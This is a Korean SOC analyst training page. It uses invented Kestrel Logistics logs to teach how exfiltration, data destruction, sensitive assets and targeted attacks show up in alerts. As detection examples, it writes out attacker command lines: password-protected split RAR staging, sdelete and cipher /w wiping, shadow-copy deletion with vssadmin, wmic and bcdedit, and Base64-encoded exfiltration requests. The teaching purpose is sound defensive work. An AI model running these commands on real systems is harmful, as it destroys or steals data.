# 경보 데이터에서 유출, 파괴, 민감한 대상, 표적 공격 알아보기 { #exfil-destruction-sensitive }

!!! abstract "이 페이지에서 다루는 것"
    앞 페이지에서는 어떤 경보가 위험한지 정했습니다. 이 페이지는 그런 상황이 **실제 데이터에서 어떻게 생겼는지** 보여 줘서, 대기열에서 알아볼 수 있게 합니다. 먼저 **데이터 유출(exfiltration)**. 공격자 입장에서 필요한 단계(접근, 모아 두기, 나갈 길 찾기, 준비, 업로드)를 하나씩 생각하고, 단계마다 남는 단서를 봅니다. Zeek `dns.log`의 DNS 터널링, `conn.log`의 길거나 무거운 연결, **4688** 이벤트 속 비밀번호·분할 압축, 한꺼번에 쏟아지는 외부 방향 방화벽 차단, DLP와 UEBA 경보, 클라우드 저장소 업로드, 프록시 로그 속 설명 안 되는 긴 파라미터 — 샘플마다 칸 단위로 읽습니다. 그다음 **데이터 파괴**. 조기 경보 신호(침해된 패치·배포 서버, 특권 계정, **5136**에 찍히는 예상 못 한 그룹 정책 변경, `sdelete`, `cipher /w`, `shred` 같은 완전 삭제 도구, **7045**와 Sysmon **6**에 찍히는 원시 디스크 드라이버, 알려진 와이퍼 계열). 이어서 **민감한 호스트, 사용자, 데이터**. 왜 미리 분류해 두는 게 짐작보다 나은지, SIEM 조회와 보강이 어떻게 경보에 중요도를 넣어 주는지, 손으로 무엇을 확인하는지(Active Directory 조회를 한 줄씩). 마지막으로 **표적 공격의 신호** — 어떤 공개 자료에도 없는 지표, 세상에 하나뿐인 파일, 우리 회사에 맞춰 만든 공격 파일과 페이지, 조사를 많이 한 피싱, 사람이 직접 조작하는 도구 — 와 아무나 노리는 공격 대 표적 공격 비교. 끝에 확인 문제와 해설이 있습니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 회사(Kestrel Logistics), 호스트 이름, 계정, 도메인, IP, 로그 줄은 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. **유출은 긴 사슬의 마지막 단계다.** 데이터에 접근 → 나갈 수 있는 곳에 모아 두기 → 나갈 길 찾기 → 준비(압축, 암호화, 분할) → 업로드. 단계마다 흔적이 남을 수 있으니 전송뿐 아니라 *준비*도 잡을 수 있다.
2. 유출의 전형적인 단서: 한 도메인으로 가는 **대량 DNS**(터널링), 평소와 다른 출발지에서 이상한 목적지로 가는 **크거나 오래 가는 연결**, **명령줄에서 만든 압축 파일**(특히 비밀번호나 분할: `7z -p -v`, `rar -hp -v`), **호스트 하나에서 여러 포트로 나가다 차단된 기록 다발**, **DLP/UEBA 경보**, **클라우드 저장소**로 업로드, **설명 안 되는 긴(흔히 Base64처럼 생긴) 파라미터가 붙은 URL**.
3. 파괴는 일찍 잡기 어렵다. 그러니 **우리 환경에서라면 어떻게 일어날지 정하고, 그 경로마다 조기 경보를 건다.** 침해된 **패치·배포 서버**, 침해된 **높은 권한 계정**, **모르는 GPO 변경**, **완전 삭제·원시 디스크 도구**, **알려진 와이퍼 계열**.
4. 완전 삭제 도구(Windows의 `sdelete`, `cipher /w`, Linux의 `shred`, `wipe`, `srm`)를 일반 사용자가 명령줄에서 돌리는 일은 드물어서 이 경보는 **잡음이 적다.** 그리고 원시 디스크 접근을 주는 드라이버(여러 와이퍼가 NTFS 권한을 우회하려고 씀)는 **드라이버 로드와 서비스 설치**로 보인다.
5. 경보가 민감한 것을 건드리는지 아는 가장 좋은 방법은 **미리 분류해 두기**다. 중요한 호스트, 관리자, 민감한 데이터를 미리 목록으로 만들어 두면 경보 자체가 "중요 시스템 대상"이라고 말해 준다. 이상적으로는 자산 목록과 Active Directory에서 **자동으로 갱신**된다.
6. 경보에 없으면 **분류할 때 보강한다.** 사용자, 호스트, 데이터부터 조회한다. 이름 규칙(`KL-DC01`, `KL-FIN-DB01`)과 직함("수석 엔지니어", "헬프데스크" — 이유는 달라도 둘 다 가치가 높다)만으로도 우선순위가 바뀐다.
7. **표적 공격의 신호**: 알려진 조직에 대한 공개 보고서와 맞는 지표, **어떤 공개 자료에도 없는** 도메인·파일, **전 세계에서 한 번** 보인 파일, 업체가 고급 계열로 이름 붙인 악성코드, 공격 파일이나 페이지 안의 **우리 로고, 이름, 인프라**, **내부 사정을 아는** 피싱, 사람이 직접 하는 행동(원격 접속 도구, 빠른 옆 이동, 서명된 악성코드, 제로데이, 닮은꼴 도메인, 복제한 페이지).
8. 공통점은 드묾이다. 아무나 노리는 캠페인은 시끄럽고 커뮤니티가 금방 기록한다. 표적 공격은 조용하고 하나뿐이다. **"아무도 본 적 없다"는 안심이 아니라 경고다.**

## SOC에서 왜 중요한가 { #why }

"유출은 거의 끝난 공격"이라는 걸 알아도, 눈앞의 경보 제목이 `DNS - excessive query length`나 `Proxy - long URI parameter`일 때 그게 유출이라는 걸 못 알아보면 소용이 없습니다. 경보 제목은 규칙 작성자가 쓴 것이고, 의도가 아니라 *증상*을 말합니다. 분류는 그 증상을 중요한 상황으로 되짚어 가는 일입니다. 데이터가 나가고 있다, 데이터가 곧 파괴된다, 핵심 자산이 건드려지고 있다, 작정한 공격자가 일하고 있다.

이 페이지가 그 되짚기 지도입니다. 상황마다 "내가 공격자라면 *이* 환경에서 무엇을 해야 하고, 그 행동이 *우리* 로그에 무엇을 남길까?"를 묻고, 그 흔적이 실제로 어떻게 생겼는지 봅니다. 같은 생각을 거꾸로 하면 탐지 공학(detection engineering)이 됩니다. 아래 단서 하나하나가 직접 만들 수 있는 경보 후보입니다.

## 데이터 유출 알아보기 { #exfiltration }

### 먼저 공격자처럼 생각한다 { #exfil-threat-model }

공격자 모자를 써 봅시다. Kestrel Logistics에서 화물 데이터베이스를 빼내고 싶습니다. 무엇이 일어나야 할까요?

1. **데이터에 접근한다.** 그걸 읽을 수 있는 계정이나 프로세스가 필요합니다. 그러니 먼저 이상한 로그온(4624/4672)이나 파일·데이터베이스 접근이 있을 수 있습니다.
2. **모아 둔다(staging).** 데이터는 데이터베이스 서버에서 바로 나가는 경우가 드뭅니다. 인터넷에 닿을 수 있는 호스트나 작업 폴더로 복사됩니다.
3. **나갈 길을 찾는다.** 방화벽은 무엇을 허용하나? 프록시가 있나? DNS만 자유롭게 나가나? 이리저리 찔러 볼 수 있습니다.
4. **준비한다.** 압축(작고 빠르게), 암호화나 비밀번호(DLP와 프록시가 못 읽게), 분할(작은 조각은 크기 제한을 피하고 다시 보내기도 쉬움).
5. **올린다.** C2 채널로, 클라우드 저장소로, DNS로, 평범해 보이는 웹 요청 속에 숨겨서.

유출은 **마지막 단계** 활동이라, 일어날 때쯤이면 앞 단계도 많이 일어났습니다. 그중 어느 것이든, 아니면 준비와 전송 자체를 잡을 수 있습니다. 우리의 통제 수단과 가시성을 이 다섯 단계에 대 보면 어느 것을 볼 수 있을지 알게 됩니다.

### 단서와 각각이 보이는 곳 { #exfil-clues }

| 단서 | 어느 단계 | 어디서 보이나 | ATT&CK |
| --- | --- | --- | --- |
| 한 도메인으로 가는, 길고 무작위한 하위 도메인의 대량 DNS | 업로드(또는 C2) | DNS 서버 로그, Zeek `dns.log`, 패시브 DNS | T1071.004, T1048 |
| 평소와 다른 출발지에서 이상한 목적지로 큰 업로드나 아주 긴 연결 | 업로드 | NetFlow, Zeek `conn.log`, 방화벽, 프록시 | T1041, T1048 |
| 비밀번호나 분할 옵션으로 명령줄에서 만든 압축 파일 | 준비 | 4688 / Sysmon 1, EDR | T1560.001 |

하나씩 봅시다.

### 대량 DNS 터널링 { #dns-tunnelling }

<strong>DNS 터널링(DNS tunnelling)</strong>은 데이터를 조회하는 **이름** 속에 인코딩해 넣습니다. 어떤 네트워크든 DNS는 (어딘가로) 나가게 해 주기 때문에, 다른 길이 다 막혔을 때 즐겨 쓰는 출구입니다. Zeek `dns.log` 일부(열 일부 생략):

```
ts                  id.orig_h     query                                                         qtype_name  rcode_name
1764141601.104512   10.20.4.112   mzxw6ytboi2dqnrrge3tmmjq.gm4tqojrgy3dkmbqgu.t.kl-cdn.example   TXT         NOERROR
1764141601.211873   10.20.4.112   nfxgg5bamjzgk3tf.hjswy3dpebwgk4tt.mfsgc4tf.t.kl-cdn.example    TXT         NOERROR
1764141601.318020   10.20.4.112   onsxe5tjmnswk.zlomvzgc3tj.nzswk5dj.t.kl-cdn.example             TXT         NOERROR
```

- `ts` — 유닉스 시각이 **0.1초 간격**. 사람이 웹을 볼 때 1초에 열 번씩 매번 새로운 이름을 조회하지는 않습니다.
- `id.orig_h 10.20.4.112` — 묻고 있는 내부 호스트(앞 페이지의 KL-WS-0412).
- `query` — 왼쪽 라벨(`mzxw6ytboi2d…`)이 **Base32처럼 생긴 뜻 없는 글자**이고, 길고, 한 번도 반복되지 않습니다. 진짜 호스트 이름은 짧고 반복됩니다. 데이터가 바로 이 라벨 안에 있습니다. 공격자가 `t.kl-cdn.example`의 권한 서버를 갖고 있어서, 모든 조회가 그 서버에 도착해 풀립니다.
- `qtype_name TXT` — TXT 레코드는 아무 글이나 **되돌려** 실어 보낼 수 있어서, 터널링 도구가 돌아오는 길로 씁니다. 워크스테이션이 TXT 레코드를 수천 번 묻는 건 아주 드문 일입니다.
- `rcode_name NOERROR` — 공격자 서버가 대답하고 있으니 통로가 살아 있습니다.

간단히 세어 보면 양이 확 드러납니다.

```
$ cat dns.log | zeek-cut id.orig_h query | awk '{n=split($2,a,"."); print $1, a[n-2]"."a[n-1]"."a[n]}' | sort | uniq -c | sort -rn | head -3
  18342 10.20.4.112 t.kl-cdn.example
    911 10.20.4.37  corp.kestrel.example
    402 10.20.4.112 corp.kestrel.example
```

- `zeek-cut id.orig_h query` — 로그에서 그 두 열만 뽑습니다.
- `awk '{…}'` — 조회 이름을 점으로 나눠 **마지막 라벨 세 개**(데이터가 가는 영역)만 남기고, 클라이언트 IP 뒤에 찍습니다.
- `sort | uniq -c | sort -rn | head -3` — 같은 줄을 세고 많은 것부터 보여 줍니다.
- 결과: 워크스테이션 하나가 외부 영역 하나에 **18,342번** 조회. 회사 자기 도메인 조회의 스무 배가 넘습니다. 웹 서핑이 아니라 터널링입니다(자세한 건 [DNS 악용](../dns/dns-abuse.md)).

### 이상한 목적지로 가는 크거나 긴 연결 { #long-connections }

대량 전송은 흐름 데이터에 모양을 남깁니다. Zeek `conn.log` 한 줄:

```
ts                 id.orig_h     id.resp_h      id.resp_p  proto  service  duration    orig_bytes    resp_bytes  conn_state
1764142010.55201   10.30.8.21    203.0.113.88   443        tcp    ssl      14512.31    9663427810    1840233     SF
```

- `id.orig_h 10.30.8.21` — **출발지**가 사용자 PC가 아니라 재무 대역의 서버입니다. 서버는 보통 연결을 *받는* 쪽인데, 서버가 큰 외부 전송을 *시작했다*는 게 이상합니다.
- `id.resp_h 203.0.113.88`, `id.resp_p 443`, `service ssl` — HTTPS로 외부 호스트. 내용은 암호화돼 있으니 모양과 목적지로 판단합니다.
- `duration 14512.31` — 하나의 연결이 약 **4시간**.
- `orig_bytes 9663427810` — **안에서 밖으로 약 9.7GB**. 방향에 주의하세요. `orig_bytes`는 연결을 시작한 쪽(우리 서버)이 보낸 양입니다.
- `resp_bytes 1840233` — 돌아온 건 1.8MB뿐. 다운로드가 아니라 응답 확인 신호입니다. 업로드 쪽으로 치우친 비율 = 데이터가 나가는 중.
- `conn_state SF` — 연결이 정상적으로 맺어지고 닫혔습니다. 전송이 끝났다는 뜻입니다.

다음 단계: 프록시나 TLS 로그(Zeek `ssl.log`: 어떤 서버 이름, 어떤 인증서?)와 목적지 평판으로 넘어갑니다. **정상 파일 공유 서비스는 훌륭한 유출 지점**이라는 것도 기억하세요. 믿을 만하고 허용돼 있으니까 정책 위반이 아닌 한 눈에 띄지 않습니다.

### 명령줄에서 만든 압축 파일 { #archives }

사람들은 대부분 오른쪽 클릭으로 압축합니다. 공격자는 명령줄 압축 도구를 쓰고, 옵션이 정체를 드러냅니다.

```
Event ID 4688  Computer: KL-FS02   2026-11-24 04:02:55
  Creator Subject:     AccountName svc_backup
  New Process Name:    C:\Users\Public\Music\rar.exe
  Creator Process:     C:\Windows\System32\cmd.exe
  Process Command Line: rar.exe a -hpLogistix2026 -m5 -v500m -r C:\Users\Public\Music\m.rar \\KL-FIN-DB01\D$\Exports\
```

- **4688** = "새 프로세스가 만들어졌습니다"(프로세스 생성 감사가 켜져 있을 때 보안 로그. Sysmon 이벤트 1이 더 자세한 짝입니다). 공격자가 띄우는 도구마다 하나씩 남기 때문에, 많은 공격자가 메모리에서만 돌리거나 믿을 만한 프로그램을 거쳐 실행하려고 애씁니다.
- `New Process Name C:\Users\Public\Music\rar.exe` — 명령줄 RAR 도구가, 아무나 쓸 수 있고 아무도 소프트웨어를 설치하지 않는 **공용 폴더**에서 실행됐습니다.
- `a` = 압축 파일에 추가. `-hp<비밀번호>` = **파일 내용과 헤더까지** 그 비밀번호로 암호화(안에 든 파일 이름조차 DLP에서 숨겨짐). `-m5` = 최대 압축. `-v500m` = **500MB 조각으로 분할**. `-r` = 하위 폴더까지.
- `\\KL-FIN-DB01\D$\Exports\` — 원본이 데이터베이스 서버의 **관리 공유**입니다. 데이터를 네트워크 너머에서 모아 두는 폴더로 끌어오고 있습니다.
- ATT&CK **T1560.001 Archive Collected Data: Archive via Utility**, **T1074.001/.002 Data Staged**(로컬/원격).

일반 사용자는 비밀번호와 분할 옵션을 붙여 명령줄에서 압축 도구를 거의 안 돌리기 때문에, `-p`, `-hp`, `-v`가 붙은 `7z`/`rar`/`winrar` 경보는 **양은 적고 가치는 높은** 탐지입니다.

### 한 출발지에서 여러 포트 차단 { #egress-probing }

방화벽 규칙을 모르는 공격자는 열린 포트를 찾을 때까지 여러 포트를 찔러 봅니다.

```
2026-11-24T03:55:01 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=8080 proto=tcp
2026-11-24T03:55:02 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=8443 proto=tcp
2026-11-24T03:55:02 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=21   proto=tcp
2026-11-24T03:55:03 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=22   proto=tcp
2026-11-24T03:55:03 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=53   proto=udp
2026-11-24T03:55:04 KL-FW01 action=allow src=10.20.4.112 dst=198.51.100.9 dport=443 proto=tcp
```

- 같은 `src`, 같은 `dst`로 **포트를 하나씩 바꿔 가며** 1초 간격: 자동화된 "어느 출구가 열려 있지?" 시험입니다(이걸 그대로 하는 도구가 있고, 대체 포트를 가진 C2 임플란트도 이렇게 합니다).
- `action=allow … dport=443` — 중요한 건 마지막 줄입니다. 공격자가 열린 길을 찾았습니다. 이제 그 길로 무엇이 나갔는지 봅니다.
- 차단 한 번은 아무 의미 없습니다. **내부 호스트 하나가 몇 초 안에 같은 목적지로 여러 다른 포트**를 시도하는 게 패턴입니다.

### DLP와 UEBA 경보 { #dlp-ueba }

<strong>데이터 유출 방지(DLP, data loss prevention)</strong> 도구는 엔드포인트, 이메일, 프록시에서 내용을 들여다보고 민감한 패턴이나 라벨을 찾습니다. <strong>사용자·개체 행동 분석(UEBA, user and entity behaviour analytics)</strong>은 사용자와 호스트마다 평소 모습을 익혀 두고 거기서 벗어나면 경보를 냅니다("`svc_backup`이 평소의 40배 데이터를 읽음"). 하나하나는 시끄러운 경우가 많습니다. 분류에서의 가치는 **쌓이는 것**에 있습니다. 내부 출발지 하나에 "민감한 데이터 접근", "이상한 양", "압축 명령줄" 경보가 함께 붙으면 그게 수집과 모아 두기의 그림입니다([DLP와 UEBA](../endpoint-defense/paw-edr-dlp-ueba.md)).

### 클라우드 저장소와 동기화 도구 { #cloud-exfil }

```
2026-11-24 04:31:12 10.20.4.112 j.moreno CONNECT g.api.mega.example:443 200 TCP_TUNNEL 512334992 "rclone/v1.6x"
```

- `CONNECT g.api.mega.example:443` — **클라우드 저장소 API** 호스트로 가는 HTTPS 터널.
- `512334992` — 터널로 약 512MB를 보냈습니다.
- `"rclone/v1.6x"` — **rclone**의 사용자 에이전트. 정상적인 명령줄 동기화 도구지만, 수십 개 클라우드 업체와 통신할 수 있어서 유출에 아주 많이 악용됩니다. 물류 사무 직원이 평소에 쓸 도구가 아닙니다.
- ATT&CK **T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage**.

### 설명 안 되는 긴 파라미터가 붙은 URL { #long-parameters }

데이터를 평범해 보이는 GET 요청에 실어 몰래 내보낼 수도 있습니다.

```
GET /index/__utm.gif?cookie=UmVwb3J0X1EzLmNzdjtjbGllbnRzPTQxMjt0b3RhbD04ODMyMTA=&r=482 HTTP/1.1
Host: stats.kl-metrics.example
```

- `/index/__utm.gif` — 누구의 브라우저든 끊임없이 요청하는 웹 분석용 추적 픽셀처럼 꾸몄습니다.
- `cookie=UmVwb3J0X1Ez…` — 영문자, 숫자, 그리고 `+/=` 정도로만 된 긴 값: **Base64**입니다. 진짜 분석 파라미터는 짧은 ID나 읽을 수 있는 이름입니다. 안전하게 풀어 보면(`echo '…' | base64 -d`) `Report_Q3.csv;clients=412;total=883210` — 파일 정보가 밖으로 나가고 있습니다.
- 이런 요청 하나는 아무것도 아닙니다. **같은 호스트로 서로 다른 긴 값을 단 요청이 수백 개**면 통로입니다([Base64](../http-analysis/base64.md)). ATT&CK **T1132.001 Data Encoding: Standard Encoding**, 그 위에서 **T1041 Exfiltration Over C2 Channel**.

## 데이터 파괴 시도 알아보기 { #destruction }

### 일어나기 전에 계획한다 { #destruction-planning }

파괴(랜섬웨어 암호화, 와이퍼)는 빠르고, 시작되면 손쓸 틈이 작습니다. 시작 *전에* 잡는 건 어렵지만 가끔은 됩니다. **우리 환경에서라면 어떻게 할지** 미리 생각해 두고 그 경로에 조기 경보를 걸어 뒀다면요. 이렇게 물어보세요. "누군가 여기 있는 컴퓨터를 한꺼번에 다 망가뜨리고 싶다면, 공격 도구를 어떻게 퍼뜨릴까?"

### 조기 경보 신호 { #destruction-signs }

- **패치·소프트웨어 배포 서버 침해.** 모든 컴퓨터에 소프트웨어를 설치할 수 있는 시스템은 모든 컴퓨터에 와이퍼도 설치할 수 있습니다(**T1072 Software Deployment Tools**). 이런 서버의 이상한 로그온이나 새 배포 패키지는 최우선입니다.
- **높은 권한 계정 침해.** 대량 파괴에는 대량 접근이 필요합니다. 도메인 관리자, 배포용 서비스 계정, 하이퍼바이저 관리자.
- **모르는 그룹 정책 변경.** 모든 컴퓨터에 예약 작업이나 시작 스크립트를 만드는 GPO는 어디서든 공격 도구를 돌리는 고전적인 방법입니다(**T1484.001 Domain or Tenant Policy Modification: Group Policy Modification**). 디렉터리 서비스 변경 감사가 켜져 있으면 도메인 컨트롤러가 **5136**("디렉터리 서비스 개체가 수정되었습니다")을 남깁니다.

    ```
    Event ID 5136  Computer: KL-DC01   2026-11-24 05:10:44
      Subject:    AccountName svc_backup
      Object:     DN CN={6B2F…},CN=Policies,CN=System,DC=corp,DC=kestrel,DC=example
                  Class groupPolicyContainer
      Attribute:  LDAP Display Name gPCMachineExtensionNames
      Operation:  Type Value Added
    ```

    - **5136**은 Active Directory 개체의 속성이 바뀔 때 도메인 컨트롤러에서 생깁니다. 여기서 개체 클래스가 `groupPolicyContainer` — **GPO**입니다.
    - `gPCMachineExtensionNames`가 바뀌었다는 건 정책에 새로운 종류의 컴퓨터 설정(예: 예약 작업, 스크립트)이 추가됐다는 뜻입니다.
    - `AccountName svc_backup` — 백업 서비스 계정이 그룹 정책을 고치는 건 정상적인 관리가 아닙니다. 공격자가 GPO를 좋아하는 이유는, 한 번 고치면 다음 정책 갱신 때 그 정책이 적용되는 모든 컴퓨터에 닿기 때문입니다.

- **완전 삭제나 원시 디스크 도구 사용.**

    ```
    Process Command Line: sdelete64.exe -accepteula -p 3 -s -q D:\Exports\
    Process Command Line: cipher.exe /w:D:\
    ```

    - `sdelete`(Sysinternals): `-p 3` 세 번 덮어쓰기, `-s` 하위 폴더까지, `-q` 조용히, `-accepteula` 사용권 동의 창을 띄우지 않음(사람 없이 스크립트로 돌린다는 단서).
    - `cipher /w:D:\` — Windows 기본 도구. `/w`는 드라이브의 **빈 공간을 덮어써서** 지운 파일을 되살릴 수 없게 합니다.
    - Linux에서는 프로세스·감사 로그의 `shred`, `wipe`, `srm`에 경보를 겁니다(예: auditd `EXECVE` 기록의 `a0="shred" a1="-n" a2="3" a3="-u"`).
    - 일반 사용자는 이런 걸 명령줄에서 거의 안 돌리니 오탐이 적습니다. ATT&CK **T1485 Data Destruction**, 흔적을 지우려고 쓰면 **T1070.004 File Deletion**.

- **원시 디스크 접근을 주는 드라이버.** 여러 와이퍼가 디스크를 직접 읽고 쓰는 정상적인 서명된 서드파티 드라이버를 불러와 NTFS 권한을 우회했습니다(2012년 Shamoon 공격과 2014년 영화사를 노린 Destover 공격이 모두 상용 원시 디스크 드라이버를 썼고, 2022년에는 한 와이퍼가 파티션 관리 프로그램의 드라이버를 악용했습니다). 새 커널 드라이버는 System 로그의 **7045**("시스템에 서비스가 설치되었습니다", `Service Type: kernel mode driver`)와 **Sysmon 이벤트 6**("드라이버 로드됨", 드라이버 경로·해시·서명 기록)으로 보입니다. 서버에 예상 못 한 커널 드라이버 — 특히 우리가 쓰지 않는 디스크 도구 업체가 서명한 것 — 가 올라오면 조기 경보입니다(**T1561 Disk Wipe**, 취약한 드라이버를 악용하면 **T1014 Rootkit** / **T1068**).
- **알려진 와이퍼나 랜섬웨어 계열 탐지.** 백신이나 EDR이 파괴로 알려진 계열 이름을 대거나, 웜처럼 퍼지는 행동을 보고하면, 첫 번째 것이 막혔더라도 곧바로 비상벨을 울립니다.
- **[보충] 복구 수단 제거.** 섀도 복사본 삭제(`vssadmin delete shadows /all /quiet`, `wmic shadowcopy delete`), `bcdedit /set {default} recoveryenabled no`, 백업 콘솔 공격(**T1490 Inhibit System Recovery**)은 보통 암호화 몇 분 전에 나옵니다.

## 민감한 호스트, 사용자, 데이터 알아보기 { #sensitive }

### 가장 좋은 방법: 미리 분류해 둔다 { #pre-classification }

경보가 중요한 호스트, 핵심 인물, 민감한 데이터와 관련 있는지 어떻게 알까요? 가장 좋은 답은 **경보가 울리기 전에 누군가 이미 정해 뒀고, 경보가 그걸 말해 주는 것**입니다. 비교해 보세요.

```
Exploit attempt: SMB remote code execution → 10.30.8.21
Exploit attempt: SMB remote code execution → 10.30.8.21 [CRITICAL ASSET: KL-FIN-DB01, tier-0 data, owner Finance]
```

두 번째는 생각할 필요가 없습니다. 이렇게 만들려면 SIEM이 **경보를 만들 때** 각 대상을 중요 자산·아이덴티티 목록에서 찾아보고, 맞으면 우선순위를 올립니다. 이게 되려면:

- 목록이 있어야 하고 **스스로 갱신돼야** 합니다. 누군가 2년 전에 마지막으로 고친 스프레드시트가 아니라, 자산 목록/CMDB와 **Active Directory**(`Domain Admins` 구성원, `adminCount=1`인 계정, `Executives` 그룹, `Tier0` OU의 서버)에서 채워지는 목록.
- 조직이 **민감한 데이터가 어디 있고 누가 접근할 수 있는지** 실제로 알아야 합니다. SOC가 끼어들기 훨씬 전부터 많은 조직이 애를 먹는 문제입니다.

간단한 SIEM 조회 파일은 이렇게 생겼을 수 있습니다.

```
host,ip,criticality,owner,notes
KL-DC01,10.10.0.10,tier0,IT-Identity,domain controller
KL-FIN-DB01,10.30.8.21,tier0,Finance,shipment and billing database
KL-OT-HMI03,10.90.3.13,tier0,Warehouse-OT,conveyor HMI - change window Sun 02:00
KL-WS-0388,10.20.4.88,low,Facilities,lobby kiosk
```

열마다 분류에 필요한 정보입니다. 얼마나 중요한가, 누구 것인가(누구에게 연락하나), 그리고 정비 시간 같은 메모(일요일 변경 시간에 KL-OT-HMI03에 서명 없는 드라이버가 올라온 것과 화요일 08:30에 올라온 것은 전혀 다른 이야기입니다).

### 경보가 말해 주지 않으면: 보강한다 { #enrichment }

중요도가 경보에 없다면, 차선책은 경보를 열 때의 **자동 보강**입니다(대부분의 경보 처리 도구와 SOAR가 해 줍니다). 최소한 **사용자, 자산, 데이터 조회가 분류의 첫 단계**입니다. 간단한 Active Directory 조회:

```
PS> Get-ADUser j.moreno -Properties Title,Department,Manager,MemberOf,adminCount |
      Select-Object SamAccountName,Title,Department,adminCount,@{n='Groups';e={$_.MemberOf -replace '^CN=([^,]+).*','$1'}}

SamAccountName : j.moreno
Title          : Help Desk Analyst
Department     : IT Service Desk
adminCount     : 1
Groups         : {Helpdesk-L2, Workstation-Admins, VPN-Users}
```

- `Get-ADUser j.moreno` — 사용자 개체를 가져옵니다. `-Properties …`는 기본으로는 안 오는 속성을 달라는 뜻입니다.
- `Select-Object …` — 쓸모 있는 칸만 보여 줍니다. `@{n='Groups';e={…}}`는 계산된 열로, 그룹마다 긴 고유 이름(DN)을 짧은 이름(CN)만 남기도록 잘라 냅니다.
- `Title: Help Desk Analyst` — 헬프데스크 직원은 낮은 직급처럼 보여도 **넓은 권한**(비밀번호 재설정, 모든 워크스테이션의 관리자)을 가진 경우가 많습니다. 공격자에게는 이런 계정이 아주 값집니다. "수석 엔지니어"가 닿을 수 있는 데이터 때문에 값진 것과 마찬가지로요.
- `adminCount: 1` — 보호되는 관리 그룹에 들어 있거나 들어 있었던 계정입니다. 특권 계정으로 다룹니다.
- `Workstation-Admins` — 모든 워크스테이션의 로컬 관리자. 이 계정을 가진 공격자는 거의 어디로든 옆 이동할 수 있습니다.

도구가 없어도 **이름 규칙**에 맥락이 들어 있습니다. `KL-DC01`(도메인 컨트롤러), `KL-FIN-DB01`(재무 데이터베이스), `KL-OT-…`(운영 기술). 좋은 이름 규칙은 공짜 보강 자료입니다.

## 표적 공격 알아보기 { #targeted }

표적 공격자는 위험의 "고급·표적" 범주입니다. 스스로 정체를 밝히진 않지만, 몇 가지 단서가 *우리를* 고른 공격자, 또는 평균보다 실력 있는 공격자를 가리킵니다.

| 영역 | 신호 | 왜 표적·고급 공격자를 암시하나 |
| --- | --- | --- |
| **특정 IOC** | 도메인, IP, 해시가 알려진 고급 조직에 대한 공개 보고서와 맞음 | 쉬운 경우. 누군가 이미 귀속(attribution) 작업을 해 둠 |
| | 도메인·URL이 **어떤 공개 자료에도 없음**(URL 스캐너, 평판 서비스, 패시브 DNS) | 대량 캠페인은 몇 시간 안에 커뮤니티 서비스에 올라옴. 완전히 없다는 건 소수 피해자용 인프라라는 뜻일 수 있음 |
| **파일** | **어디서도 본 적 없는** 악성코드(백신·EDR 클라우드 평판: 보급도 1) | 흔한 악성코드는 어디에나 있음. 하나뿐인 파일은 우리를 위해 만들었을 가능성 |
| | 업체가 고급 조직과 연관된 계열로 이름을 붙임 | 강한 신호. 빨리 움직임 |
| | **사람이 조작하는 침투 후 도구**(C2 프레임워크, 자격 증명 덤프 도구) | 자동 봇이 아니라 누군가 키보드 앞에 있음 |
| | **우리에게 맞춘** 파일: 문자열이나 설정에 우리 회사 이름, 내부 호스트 이름, 도메인 | 누군가 공을 들여 공격을 맞춤 제작함 |
| **이메일** | **특정 한 사람에게 맞춘** 잘 짜인 미끼 | 누가 무슨 일을 하는지 조사했음 |
| | **내부 사정**: 내부 프로젝트 이름, 실제 동료, 실제 절차 | 사전 정찰이나 이전 침해 |
| **행동** | **원격 접속 도구** 설치(T1219) | 지속적이고 대화형인 접근 |
| | **최초 침해 직후의 옆 이동** | 네트워크 안에서 목표를 쫓는 사람 |
| | **품질 좋은 서명된 악성코드**(T1553.002) | 훔치거나 산 코드 서명 인증서는 돈과 노력이 듦 |
| | **제로데이 익스플로잇**(T1203, T1190) | 비쌈. 아무 대상에나 낭비하지 않음 |
| | 우리 사이트의 **닮은꼴 도메인과 복제 페이지**(T1583.001, T1566.002) | 우리 사용자만을 위해 만듦 |

파일의 드묾에 대해: NSA 공격 해킹 부서를 이끌었던 사람이 공개 강연에서 방어자들에게 이런 조언을 한 적이 있습니다(요지만 옮기면). 평판 서비스가 어떤 실행 파일이 인터넷 역사 전체에서 딱 한 번 실행됐다고 하는데 그 한 번이 내 컴퓨터라면, 아주 많이 걱정해야 한다. 앞 페이지의 "가장 적게 울린 경보" 규칙과 같은 논리를, 우리 SIEM이 아니라 전 세계에 적용한 겁니다.

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효"
    접근 방식은 그대로입니다. *우리* 환경에서 유출이나 파괴가 어떻게 일어나야 할지 모델링하고, 단계마다 경보를 걸고, 출발지 하나에 쌓이는 약한 신호를 합칩니다. 구체적인 단서도 여전히 통합니다. DNS 터널링의 양, 업로드로 치우친 긴 연결, 비밀번호·분할 옵션을 단 명령줄 압축 도구, 방화벽 로그의 출구 탐색, Base64처럼 생긴 파라미터, 완전 삭제 도구, 예상 못 한 커널 드라이버(7045, Sysmon 6), GPO 변경(5136), 섀도 복사본 삭제. 무엇이 민감한지 아는 방법도 여전히 미리 분류한 중요 자산·아이덴티티와 분류 때의 보강입니다. 드묾 — 공개 자료에 없음, 보급도 1 — 도 여전히 표적 공격의 가장 좋은 신호 중 하나입니다.

!!! info "[변경됨] 바뀐 점"
    - **암호화 대신 탈취가 많아졌다.** 2024년 이후 업계 보고서들은 협박 공격의 큰 부분이 암호화 없이 데이터를 훔치는 형태라고 말하고, Mandiant의 M-Trends 2026은 백업, 아이덴티티 서비스, 하이퍼바이저를 노리는 "복구 거부(recovery denial)"를 설명합니다. 이제 유출 신호가 서막이 아니라 *본 공연*인 경우가 많습니다.
